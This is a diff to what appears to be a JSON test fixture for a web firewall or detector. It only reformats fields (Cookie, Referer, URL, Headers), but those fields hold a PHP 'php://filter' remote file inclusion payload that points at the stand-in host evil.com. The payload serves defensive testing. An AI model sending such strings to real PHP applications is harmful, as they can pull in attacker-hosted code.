@@ -5,10 +5,10 @@
         "UA": "php://filter/read=string.rot13/resource=http://evil.com/index.php",
         "Body": "php://filter/read=string.rot13/resource=http://evil.com/index.php",
         "ARGS": "php://filter/read=string.rot13/resource=http://evil.com/index.php",
-        "Cookie" : "php://filter/read=string.rot13/resource=http://evil.com/index.php",
-        "URL": "null",        
-        "Referer" : "php://filter/read=string.rot13/resource=http://evil.com/index.php",
-        "Headers": "null"
+        "Cookie": "php://filter/read=string.rot13/resource=http://evil.com/index.php",
+        "URL": "",        
+        "Referer": "php://filter/read=string.rot13/resource=http://evil.com/index.php",
+        "Headers": ""
       }
     ]
   }
